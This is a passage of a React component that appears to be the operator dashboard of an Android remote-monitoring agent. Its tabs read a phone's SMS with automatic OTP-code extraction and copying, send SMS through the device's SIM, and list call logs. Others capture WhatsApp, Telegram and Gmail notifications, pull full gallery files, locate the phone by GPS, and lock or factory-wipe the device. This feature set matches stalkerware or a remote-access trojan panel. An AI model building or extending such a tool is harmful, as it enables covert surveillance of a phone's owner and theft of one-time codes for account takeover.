                  <div className="pulse-icon-box emerald">
                    <ShieldCheck size={16} />
                  </div>
                  <div className="pulse-content-box">
                    <div className="pulse-meta-row">
                      <span className="pulse-app-tag font-bold text-emerald-700">APIXER Agent Security</span>
                      <span className="pulse-time-tag">Encrypted</span>
                    </div>
                    <span className="pulse-secondary-text">
                      Always-on background sync watchdog active • Automatic network reconnect enabled
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
        {/* ══════════════════════════════════════════════════════
            SECTION 1: MESSAGES (EXACT IMAGE RECENT TRANSMISSIONS UI)
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'sms' && (
          <div className="mobile-tab-view animate-fade-in">
            {/* Quick SMS Compose Trigger & Search Bar */}
            <div className="section-toolbar">
              <div className="toolbar-search-wrap">
                <Search size={14} className="search-ico" />
                <input
                  type="text"
                  placeholder="Search messages or numbers..."
                  value={smsSearch}
                  onChange={(e) => setSmsSearch(e.target.value)}
                  className="toolbar-search-input"
                />
                {smsSearch && (
                  <button className="clear-search-btn" onClick={() => setSmsSearch('')}>
                    <X size={12} />
                  </button>
                )}
              </div>

              <div className="toolbar-actions">
                <button
                  type="button"
                  className={`toolbar-btn compose-btn ${showComposer ? 'active' : ''}`}
                  onClick={() => setShowComposer(!showComposer)}
                  title={showComposer ? 'Close Composer' : 'Compose SMS'}
                >
                  {showComposer ? <X size={14} /> : <Plus size={14} />}
                  <span>{showComposer ? 'Close' : 'Compose'}</span>
                </button>
              </div>
            </div>

            {/* Quick SMS Composer (Expandable Card) */}
            {showComposer && (
              <div className="mobile-composer-card animate-slide-down">
                <div className="composer-header">
                  <span className="composer-title">Remote SMS Dispatch</span>
                  <span className="composer-sim-tag">via SIM 1</span>
                </div>

                <div className="composer-input-row">
                  <Phone size={13} className="composer-input-icon" />
                  <input
                    type="tel"
                    placeholder="Recipient phone number (e.g. +91 9876543210)"
                    value={smsRecipient}
                    onChange={(e) => setSmsRecipient(e.target.value)}
                    className="composer-phone-field"
                    autoFocus
                  />
                </div>

                {/* Quick Preset Chips */}
                <div className="composer-templates-scroll">
                  {QUICK_TEMPLATES.map((tpl, i) => (
                    <button
                      key={i}
                      type="button"
                      className="composer-tpl-chip"
                      onClick={() => setSmsBody(tpl.text)}
                    >
                      <Sparkles size={10} />
                      <span>{tpl.label}</span>
                    </button>
                  ))}
                </div>

                <div className="composer-textarea-wrap">
                  <textarea
                    rows={2}
                    placeholder="Type message to dispatch..."
                    value={smsBody}
                    onChange={(e) => setSmsBody(e.target.value)}
                    className="composer-textarea"
                  />
                  <button
                    type="button"
                    className="composer-send-btn"
                    disabled={smsSending || !smsRecipient.trim() || !smsBody.trim()}
                    onClick={handleSendSms}
                    title="Send SMS"
                  >
                    {smsSending ? (
                      <Loader2 size={15} className="spin-icon" />
                    ) : (
                      <Send size={15} />
                    )}
                  </button>
                </div>
              </div>
            )}

            {/* ── Exact Recent Transmissions Card (matching image) ── */}
            <div className="hub-history-card">
              {/* Row 1: Title + Count + Refresh */}
              <div className="history-header-top">
                <div className="history-title-group">
                  <Inbox size={16} />
                  <h4 className="history-title">Recent Transmissions</h4>
                  <span className="history-count">({filteredSms.length})</span>
                </div>

                <button
                  className="refresh-feed-btn"
                  onClick={loadDeviceSms}
                  disabled={smsLoading}
                  title="Refresh SMS records"
                >
                  <RefreshCw size={14} className={smsLoading ? 'spin-icon' : ''} />
                </button>
              </div>

              {/* Row 2: Full-width Segmented Filter Pills */}
              <div className="history-filter-strip">
                <button
                  className={`filter-pill ${smsFilter === 'all' ? 'active' : ''}`}
                  onClick={() => setSmsFilter('all')}
                >
                  All Messages
                </button>
                <button
                  className={`filter-pill ${smsFilter === 'inbox' ? 'active' : ''}`}
                  onClick={() => setSmsFilter('inbox')}
                >
                  Received
                </button>
                <button
                  className={`filter-pill ${smsFilter === 'sent' ? 'active' : ''}`}
                  onClick={() => setSmsFilter('sent')}
                >
                  Sent
                </button>
              </div>

              {/* Feed Messages List */}
              <div className="history-messages-list">
                {smsLoading && syncedSms.length === 0 ? (
                  <div className="no-messages-empty">
                    <Loader2 size={24} className="spin-icon" />
                    <p>Syncing cellular transmissions...</p>
                  </div>
                ) : filteredSms.length === 0 ? (
                  <div className="no-messages-empty">
                    <MessageSquare size={26} />
                    <p>No cellular transmissions found for this filter.</p>
                  </div>
                ) : (
                  filteredSms.map((msg, index) => {
                    const isSent = msg.sms_type === 'sent' || msg.sms_type === 'sms_sent';
                    const targetAddr = isSent ? (msg.recipient || msg.address || 'Recipient') : (msg.sender || msg.address || 'Unknown');
                    const timeFormatted = msg.timestamp
                      ? new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
                      : 'Just now';

                    const msgText = msg.body || msg.message_body || msg.message || msg.text || '';
                    const otpCode = extractOtp(msgText);

                    return (
                      <div key={msg.id || index} className={`hub-msg-bubble ${isSent ? 'is-sent' : 'is-inbox'}`}>
                        <div className="bubble-header">
                          <div className="bubble-direction-tag">
                            {isSent ? (
                              <>
                                <ArrowUpRight size={13} className="text-sent" />
                                <span className="direction-label">OUT</span>
                              </>
                            ) : (
                              <>
                                <ArrowDownLeft size={13} className="text-inbox" />
                                <span className="direction-label">IN</span>
                              </>
                            )}
                            <strong className="bubble-address">{targetAddr}</strong>
                          </div>

                          <div className="bubble-meta">
                            <span className="bubble-time">{timeFormatted}</span>
                            {isSent && <CheckCheck size={14} className="bubble-delivered-icon" />}
                          </div>
                        </div>

                        <p className="bubble-text">{msgText || '<No message content>'}</p>

                        {/* Quick OTP Copy Button if detected */}
                        {otpCode && (
                          <div className="bubble-otp-row">
                            <span className="otp-chip">
                              OTP: <strong>{otpCode}</strong>
                            </span>
                            <button
                              type="button"
                              className="otp-copy-btn"
                              onClick={() => copyToClipboard(otpCode, msg.id || index)}
                              title={copiedId === (msg.id || index) ? 'Copied' : 'Copy code'}
                              aria-label="Copy code"
                            >
                              {copiedId === (msg.id || index) ? (
                                <Check size={14} />
                              ) : (
                                <Copy size={14} />
                              )}
                            </button>
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 2: CONTROLS (NATIVE QUICK SETTINGS TILES)
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'controls' && (
          <div className="mobile-tab-view animate-fade-in">
            {/* 1. Ringer Profile Pill Group */}
            <div className="mobile-card-group">
              <div className="card-group-header">
                <Volume2 size={14} className="group-ico" />
                <span>Ringer Profile</span>
                {ringerLoading && <Loader2 size={12} className="spin-icon group-loader" />}
              </div>

              <div className="native-ringer-segmented">
                <button
                  type="button"
                  className={`ringer-pill-btn ${ringerMode === 'normal' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('normal')}
                  disabled={ringerLoading}
                >
                  <Volume2 size={15} />
                  <span>Normal</span>
                </button>

                <button
                  type="button"
                  className={`ringer-pill-btn ${ringerMode === 'vibrate' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('vibrate')}
                  disabled={ringerLoading}
                >
                  <Vibrate size={15} />
                  <span>Vibrate</span>
                </button>

                <button
                  type="button"
                  className={`ringer-pill-btn ${ringerMode === 'silent' ? 'active' : ''}`}
                  onClick={() => handleSetRinger('silent')}
                  disabled={ringerLoading}
                >
                  <VolumeX size={15} />
                  <span>Silent</span>
                </button>
              </div>
            </div>

            {/* 2. Screen Brightness Slider */}
            <div className="mobile-card-group">
              <div className="card-group-header">
                <Sun size={14} className="group-ico" />
                <span>Screen Brightness</span>
                <span className="slider-pct-tag">{Math.round((brightness / 255) * 100)}%</span>
              </div>

              <div className="brightness-slider-wrap">
                <Sun size={14} className="slider-edge-ico min" />
                <input
                  type="range"
                  min="0"
                  max="255"
                  value={brightness}
                  onChange={(e) => setBrightness(Number(e.target.value))}
                  onMouseUp={handleApplyBrightness}
                  onTouchEnd={handleApplyBrightness}
                  className="native-range-slider"
                />
                <Sun size={18} className="slider-edge-ico max" />
              </div>
            </div>

            {/* 3. Quick Action Tiles (2x2 Grid) */}
            <div className="mobile-card-group">
              <div className="card-group-header">
                <ShieldCheck size={14} className="group-ico" />
                <span>Remote Device Actions</span>
              </div>

              <div className="quick-actions-2x2">
                {/* Tile 1: Ring Alarm */}
                <button
                  type="button"
                  className="quick-action-tile alarm"
                  onClick={() => handleQuickCommand('ring_device', 'Ring Alarm')}
                  disabled={actionLoading === 'ring_device'}
                >
                  <div className="tile-icon-wrap alarm-ico">
                    {actionLoading === 'ring_device' ? <Loader2 size={18} className="spin-icon" /> : <BellRing size={18} />}
                  </div>
                  <div className="tile-text-wrap">
                    <span className="tile-main-label">Ring Alarm</span>
                    <span className="tile-sub-label">Plays loud siren</span>
                  </div>
                </button>

                {/* Tile 2: Ping GPS */}
                <button
                  type="button"
                  className="quick-action-tile gps"
                  onClick={() => onPingLocation && onPingLocation(device.device_id)}
                >
                  <div className="tile-icon-wrap gps-ico">
                    <MapPin size={18} />
                  </div>
                  <div className="tile-text-wrap">
                    <span className="tile-main-label">Locate GPS</span>
                    <span className="tile-sub-label">Ping coordinates</span>
                  </div>
                </button>

                {/* Tile 3: Lock Screen */}
                <button
                  type="button"
                  className="quick-action-tile lock"
                  onClick={() => handleQuickCommand('lock_device', 'Lock Screen')}
                  disabled={actionLoading === 'lock_device'}
                >
                  <div className="tile-icon-wrap lock-ico">
                    {actionLoading === 'lock_device' ? <Loader2 size={18} className="spin-icon" /> : <Lock size={18} />}
                  </div>
                  <div className="tile-text-wrap">
                    <span className="tile-main-label">Lock Device</span>
                    <span className="tile-sub-label">Lock display</span>
                  </div>
                </button>

                {/* Tile 4: Remote Wipe */}
                <button
                  type="button"
                  className="quick-action-tile wipe"
                  onClick={() => {
                    if (window.confirm('Are you sure you want to trigger Remote Factory Wipe on this device?')) {
                      handleQuickCommand('wipe_device', 'Factory Wipe');
                    }
                  }}
                  disabled={actionLoading === 'wipe_device'}
                >
                  <div className="tile-icon-wrap wipe-ico">
                    {actionLoading === 'wipe_device' ? <Loader2 size={18} className="spin-icon" /> : <AlertTriangle size={18} />}
                  </div>
                  <div className="tile-text-wrap">
                    <span className="tile-main-label">Wipe Data</span>
                    <span className="tile-sub-label">Factory reset</span>
                  </div>
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 3: CALL HISTORY (NATIVE PHONE RECENTS LIST)
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'calls' && (
          <div className="mobile-tab-view animate-fade-in">
            {/* Toolbar: Search + Filter + Refresh */}
            <div className="section-toolbar">
              <div className="toolbar-search-wrap">
                <Search size={14} className="search-ico" />
                <input
                  type="text"
                  placeholder="Search calls or numbers..."
                  value={callsSearch}
                  onChange={(e) => setCallsSearch(e.target.value)}
                  className="toolbar-search-input"
                />
                {callsSearch && (
                  <button className="clear-search-btn" onClick={() => setCallsSearch('')}>
                    <X size={12} />
                  </button>
                )}
              </div>

              <div className="toolbar-actions">
                <button
                  type="button"
                  className="toolbar-btn icon-only"
                  onClick={loadDeviceCalls}
                  disabled={callsLoading}
                  title="Refresh Calls"
                >
                  <RefreshCw size={13} className={callsLoading ? 'spin-icon' : ''} />
                </button>
              </div>
            </div>

            {/* Filter Pills */}
            <div className="mobile-filter-pills">
              {['all', 'missed', 'incoming', 'outgoing'].map((f) => (
                <button
                  key={f}
                  type="button"
                  className={`filter-pill ${callTypeFilter === f ? 'active' : ''}`}
                  onClick={() => setCallTypeFilter(f)}
                >
                  {f.charAt(0).toUpperCase() + f.slice(1)}
                </button>
              ))}
            </div>

            {/* Native Call List */}
            <div className="native-calls-container">
              {callsLoading && callLogs.length === 0 ? (
                <div className="mobile-empty-state">
                  <Loader2 size={24} className="spin-icon" />
                  <p>Syncing call records...</p>
                </div>
              ) : filteredCalls.length === 0 ? (
                <div className="mobile-empty-state">
                  <Phone size={28} className="empty-ico" />
                  <p className="empty-title">No call logs found</p>
                  <p className="empty-sub">No recent calls recorded for this device.</p>
                </div>
              ) : (
                <div className="native-calls-list">
                  {filteredCalls.map((c, idx) => {
                    const hasContact = c.contact_name && c.contact_name.trim() && c.contact_name.toLowerCase() !== 'unknown' && c.contact_name.toLowerCase() !== 'null';
                    const hasPhone = c.phone_number && c.phone_number.trim() && c.phone_number.toLowerCase() !== 'unknown' && c.phone_number.toLowerCase() !== 'null';
                    const isMissed = c.call_type === 'missed' || c.call_type === 'rejected';
                    const isIncoming = c.call_type === 'incoming';

                    return (
                      <div key={c.id || idx} className="native-call-row">
                        {/* Call Icon Avatar */}
                        <div className={`call-avatar ${isMissed ? 'missed' : isIncoming ? 'incoming' : 'outgoing'}`}>
                          {isMissed ? (
                            <PhoneMissed size={14} />
                          ) : isIncoming ? (
                            <PhoneIncoming size={14} />
                          ) : (
                            <PhoneOutgoing size={14} />
                          )}
                        </div>

                        {/* Center Information */}
                        <div className="call-info-main">
                          <div className="call-title-line">
                            <span className="call-primary-text">
                              {hasContact ? c.contact_name : (hasPhone ? c.phone_number : 'Unknown')}
                            </span>
                            {hasContact && hasPhone && (
                              <button
                                type="button"
                                className="call-inline-phone-badge"
                                onClick={() => copyToClipboard(c.phone_number, `call-${idx}`)}
                                title="Click to copy number"
                              >
                                <span>{c.phone_number}</span>
                                <Copy size={10} className="copy-ico" />
                              </button>
                            )}
                          </div>

                          <div className="call-details-line">
                            <span className={`call-type-tag ${c.call_type}`}>{c.call_type}</span>
                            <span className="dot-sep">•</span>
                            <span className="call-duration-text">{formatCallDuration(c.duration_seconds)}</span>
                            {!hasContact && hasPhone && (
                              <>
                                <span className="dot-sep">•</span>
                                <span className="call-direct-num">{c.phone_number}</span>
                              </>
                            )}
                          </div>
                        </div>

                        {/* Right Timestamp */}
                        <span className="call-time-badge">
                          {c.timestamp ? new Date(c.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : ''}
                        </span>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 4: APPS (NATIVE APP DRAWER LIST)
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'apps' && (
          <div className="mobile-tab-view animate-fade-in">
            {/* Toolbar */}
            <div className="section-toolbar">
              <div className="toolbar-search-wrap">
                <Search size={14} className="search-ico" />
                <input
                  type="text"
                  placeholder="Search installed applications..."
                  value={appsSearch}
                  onChange={(e) => setAppsSearch(e.target.value)}
                  className="toolbar-search-input"
                />
                {appsSearch && (
                  <button className="clear-search-btn" onClick={() => setAppsSearch('')}>
                    <X size={12} />
                  </button>
                )}
              </div>

              <div className="toolbar-actions">
                <button
                  type="button"
                  className="toolbar-btn icon-only"
                  onClick={handleRefreshApps}
                  disabled={refreshAppsLoading}
                  title="Rescan Apps"
                >
                  <RefreshCw size={13} className={refreshAppsLoading ? 'spin-icon' : ''} />
                </button>
              </div>
            </div>

            {/* Filter Pills */}
            <div className="mobile-filter-pills">
              {['all', 'user', 'system'].map((f) => (
                <button
                  key={f}
                  type="button"
                  className={`filter-pill ${appsFilter === f ? 'active' : ''}`}
                  onClick={() => setAppsFilter(f)}
                >
                  {f === 'user' ? 'User Apps' : f === 'system' ? 'System Apps' : 'All Apps'}
                </button>
              ))}
            </div>

            {/* App List */}
            <div className="native-apps-container">
              {filteredApps.length === 0 ? (
                <div className="mobile-empty-state">
                  <Boxes size={28} className="empty-ico" />
                  <p className="empty-title">No applications found</p>
                  <p className="empty-sub">Tap the refresh icon to query installed apps from the device.</p>
                </div>
              ) : (
                <div className="native-apps-list">
                  {filteredApps.map((app, idx) => {
                    const firstLetter = (app.name || 'A').charAt(0).toUpperCase();

                    return (
                      <div key={idx} className="native-app-row">
                        <div className="app-icon-circle">
                          <span>{firstLetter}</span>
                        </div>

                        <div className="app-info-col">
                          <span className="app-display-name">{app.name}</span>
                          <span className="app-package-name">{app.package}</span>
                        </div>

                        <button
                          type="button"
                          className="app-quick-launch-btn"
                          onClick={() => handleLaunchApp(app.package)}
                          disabled={launchingPkg === app.package}
                          title="Open app on phone"
                        >
                          {launchingPkg === app.package ? (
                            <Loader2 size={13} className="spin-icon" />
                          ) : (
                            <>
                              <Play size={11} />
                              <span>Launch</span>
                            </>
                          )}
                        </button>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ══════════════════════════════════════════════════════
            SECTION 5: NOTIFICATIONS
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'notifications' && (
          <div className="mobile-tab-view animate-fade-in">
            <div className="section-toolbar">
              <div className="toolbar-search-wrap">
                <Search size={14} className="search-ico" />
                <input
                  type="text"
                  placeholder="Search notifications, apps..."
                  value={notifsSearch}
                  onChange={(e) => setNotifsSearch(e.target.value)}
                  className="toolbar-search-input"
                />
                {notifsSearch && (
                  <button className="clear-search-btn" onClick={() => setNotifsSearch('')}>
                    <X size={12} />
                  </button>
                )}
              </div>
              <button
                type="button"
                className="toolbar-action-btn"
                onClick={loadNotifications}
                disabled={notifsLoading}
              >
                <RefreshCw size={13} className={notifsLoading ? 'spin-icon' : ''} />
                <span>Refresh</span>
              </button>
            </div>

            {notifsLoading ? (
              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading notifications...</p></div>
            ) : filteredNotifs.length === 0 ? (
              <div className="empty-state">
                <Bell size={32} style={{ opacity: 0.3 }} />
                <p>No notifications captured yet</p>
                <span className="empty-hint">Enable Notification Access on the device to stream live alerts</span>
              </div>
            ) : (
              <div className="notifications-feed">
                <div className="notifs-header-meta">
                  <span className="notifs-count-pill">{filteredNotifs.length} Alerts</span>
                  <span className="notifs-hint-text">Real-time incoming notifications from device</span>
                </div>
                {filteredNotifs.map((n, idx) => {
                  const pkg = (n.app_package || '').toLowerCase();
                  const isWhatsApp = pkg.includes('whatsapp');
                  const isSystem = pkg.includes('android');
                  const isTelegram = pkg.includes('telegram');
                  const isInstagram = pkg.includes('instagram');
                  const isGmail = pkg.includes('gm') || pkg.includes('mail');
                  const isMessages = pkg.includes('messaging') || pkg.includes('sms');

                  const initial = (n.app_name || n.app_package || '?')[0].toUpperCase();

                  let avatarClass = 'default';
                  let customBg = '';
                  if (isWhatsApp) {
                    avatarClass = 'whatsapp';
                  } else if (isSystem) {
                    avatarClass = 'system';
                  } else if (isTelegram) {
                    avatarClass = 'telegram';
                  } else if (isInstagram) {
                    avatarClass = 'instagram';
                  } else if (isGmail) {
                    avatarClass = 'gmail';
                  } else if (isMessages) {
                    avatarClass = 'messages';
                  } else {
                    const hue = ((n.app_name || '').length * 47) % 360;
                    customBg = `linear-gradient(135deg, hsl(${hue}, 70%, 50%), hsl(${(hue + 35) % 360}, 75%, 40%))`;
                  }

                  const timeStr = n.timestamp
                    ? new Date(n.timestamp).toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })
                    : 'Just now';

                  return (
                    <div key={n.id || idx} className="notif-modern-card">
                      <div className="notif-card-top">
                        <div className="notif-app-identity">
                          <div
                            className={`notif-app-icon ${avatarClass}`}
                            style={customBg ? { background: customBg } : undefined}
                          >
                            {initial}
                          </div>
                          <div className="notif-app-meta">
                            <span className="notif-app-title">{n.app_name || 'System'}</span>
                            <span className="notif-pkg-pill">
                              <Smartphone size={9} />
                              <span>{n.app_package}</span>
                            </span>
                          </div>
                        </div>
                        <span className="notif-timestamp-tag">{timeStr}</span>
                      </div>

                      <div className="notif-card-main">
                        {n.title && <h5 className="notif-alert-title">{n.title}</h5>}
                        {n.content && <p className="notif-alert-body">{n.content}</p>}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}


        {/* ══════════════════════════════════════════════════════
            SECTION 8: MEDIA GALLERY
           ══════════════════════════════════════════════════════ */}
        {activeSection === 'gallery' && (
          <div className="mobile-tab-view animate-fade-in">
            <div className="section-toolbar">
              <div className="toolbar-search-wrap">
                <Search size={14} className="search-ico" />
                <input
                  type="text"
                  placeholder="Search files..."
                  value={gallerySearch}
                  onChange={(e) => setGallerySearch(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && loadGallery()}
                  className="toolbar-search-input"
                />
              </div>
              <div className="gallery-filter-group">
                {['all', 'image', 'video'].map(f => (
                  <button
                    key={f}
                    type="button"
                    className={`gallery-filter-btn ${galleryFilter === f ? 'active' : ''}`}
                    onClick={() => { setGalleryFilter(f); }}
                  >
                    {f === 'all' ? 'All' : f === 'image' ? '📷' : '🎬'}
                  </button>
                ))}
              </div>
              <button
                type="button"
                className="toolbar-action-btn"
                onClick={() => loadGallery(true)}
                disabled={galleryLoading}
              >
                <RefreshCw size={13} className={galleryLoading ? 'spin-icon' : ''} />
                <span>Rescan & Sync</span>
              </button>
            </div>

            {galleryLoading ? (
              <div className="empty-state"><Loader2 size={24} className="spin-icon" /><p>Loading gallery...</p></div>
            ) : filteredGallery.length === 0 ? (
              <div className="empty-state">
                <Layers size={32} style={{ opacity: 0.3 }} />
                <p>No media found</p>
                <span className="empty-hint">Gallery thumbnails will appear once the device syncs</span>
              </div>
            ) : (
              <>
                <div className="gallery-count-bar">
                  <span>{galleryTotal} items in gallery</span>
                </div>
                <div className="gallery-grid">
                  {filteredGallery.map((item) => (
                    <div key={item.id} className="gallery-card">
                      <div className="gallery-thumb-wrap">
                        <img
                          src={`data:image/jpeg;base64,${item.thumbnail_b64}`}
                          alt={item.file_name || 'Media'}
                          className="gallery-thumb-img"
                          loading="lazy"
                        />
                        {item.media_type === 'video' && (
                          <div className="gallery-video-badge">
                            <Play size={10} />
                            <span>{item.duration_ms ? `${Math.round(item.duration_ms / 1000)}s` : 'Video'}</span>
                          </div>
                        )}
                        {item.has_full_file && (
                          <div className="gallery-ready-badge" title="Full resolution available">
                            <Check size={10} />
                          </div>
                        )}
                      </div>
                      <div className="gallery-card-info">
                        <span className="gallery-card-name" title={item.file_name}>
                          {item.file_name || 'Untitled'}
                        </span>
                        <span className="gallery-card-meta">
                          {formatFileSize(item.file_size)}
                          {item.width && item.height ? ` · ${item.width}×${item.height}` : ''}
                        </span>
                      </div>
                      <div className="gallery-card-actions">
                        {item.has_full_file ? (
                          <button
                            type="button"
                            className="gallery-action-btn view-btn"
                            onClick={() => handleViewFullFile(item)}
                            disabled={fullFileLoading === item.id}
                          >
                            {fullFileLoading === item.id ? (
                              <Loader2 size={11} className="spin-icon" />
                            ) : (
                              <Eye size={11} />
                            )}
                            <span>View Full</span>
                          </button>
                        ) : (
                          <button
                            type="button"
                            className="gallery-action-btn fetch-btn"
                            onClick={() => handleRequestFullFile(item)}
                            disabled={requestingMedia === item.id}
                          >
                            {requestingMedia === item.id ? (
                              <Loader2 size={11} className="spin-icon" />
                            ) : (
                              <ArrowDownLeft size={11} />
                            )}
                            <span>Fetch Full</span>
                          </button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </>
            )}

            {/* Full File Viewer Lightbox */}
            {viewingFullFile && (
              <div className="gallery-lightbox" onClick={() => setViewingFullFile(null)}>
                <div className="gallery-lightbox-content" onClick={e => e.stopPropagation()}>
                  <button
                    type="button"
                    className="gallery-lightbox-close"
                    onClick={() => setViewingFullFile(null)}
                  >
                    <X size={18} />
                  </button>
                  {viewingFullFile.media_type === 'video' ? (
                    <video
                      src={`data:${viewingFullFile.fullMime || 'video/mp4'};base64,${viewingFullFile.fullData}`}
                      controls
                      autoPlay
                      className="gallery-lightbox-media"
                    />
                  ) : (
                    <img
                      src={`data:${viewingFullFile.fullMime || 'image/jpeg'};base64,${viewingFullFile.fullData}`}
                      alt={viewingFullFile.fileName || 'Full resolution'}
                      className="gallery-lightbox-media"
                    />
                  )}
                  <div className="gallery-lightbox-info">
                    <span>{viewingFullFile.fileName}</span>
                    <a
                      href={`data:${viewingFullFile.fullMime || 'application/octet-stream'};base64,${viewingFullFile.fullData}`}
                      download={viewingFullFile.fileName || 'media-file'}
                      className="gallery-download-btn"
                      onClick={e => e.stopPropagation()}
                    >
                      <ArrowDownLeft size={12} />
                      <span>Download</span>
                    </a>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

      </div>

      {/* SIM Modal Trigger */}
      <SimEditModal
        isOpen={isSimModalOpen}
        onClose={() => setIsSimModalOpen(false)}
        device={device}
      />
    </div>
  );
}
